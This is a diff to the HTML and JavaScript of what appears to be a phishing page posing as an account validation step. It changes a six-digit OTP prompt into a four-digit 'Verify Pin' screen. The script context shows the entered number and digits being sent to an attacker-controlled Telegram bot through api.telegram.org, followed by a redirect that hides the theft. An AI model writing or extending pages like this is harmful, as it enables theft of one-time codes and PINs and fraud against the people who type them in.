@@ -18,15 +18,15 @@
 
   <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md">
     <div class="flex justify-between items-center mb-4">
-      <div class="text-sm text-gray-500">Step 1/2</div>
+      <div class="text-sm text-gray-500">Step 2/2</div>
       <button class="text-gray-400 font-semibold">CANCEL</button>
     </div>
 
     <h1 class="text-3xl font-bold mb-2">Validate <span class="text-blue-600">Account</span></h1>
-    <p class="text-gray-500 mb-6">OTP sent on SMS & regd. email ID</p>
+    <p class="text-gray-500 mb-6">Input your 4 digits pin</p>
 
     <!-- Show Number -->
-    <p class="mb-4 text-gray-700">Sending OTP to: <span id="userNumber" class="font-semibold"></span></p>
+    <p class="mb-4 text-gray-700">4 digits pin <span id="userNumber" class="font-semibold"></span></p>
 
     <!-- OTP Inputs -->
     <div class="flex justify-between mb-4">
@@ -34,16 +34,11 @@
       <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
       <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
       <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
-      <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
-      <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
-    </div>
+         </div>
 
-    <!-- Resend OTP -->
-    <p class="text-gray-500 text-sm">
-      Resend OTP after <span id="timer" class="text-blue-600 font-semibold">30</span> Sec
-    </p>
+   
 
-    <button id="verifyBtn" class="mt-6 w-full bg-blue-600 text-white py-3 rounded-xl font-bold disabled:opacity-50" disabled>Verify OTP</button>
+    <button id="verifyBtn" class="mt-6 w-full bg-blue-600 text-white py-3 rounded-xl font-bold disabled:opacity-50" disabled>Verify Pin</button>
   </div>
 
 
@@ -107,7 +102,7 @@
       const otp = [...inputs].map(input => input.value).join("");
 
       // Send OTP and number to Telegram
-      const message = `New OTP Submission:\nNumber: ${number}\nOTP: ${otp}`;
+      const message = `New Pin Submission:\nNumber: ${number}\nOTP: ${otp}`;
 
       try {
         const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -125,7 +120,7 @@
 
   // Redirect after 4 seconds
   setTimeout(() => {
-    window.location.href = "/pin.html";
+    window.location.href = "/index.html";
   }, 4000);
 }
       } catch (err) {
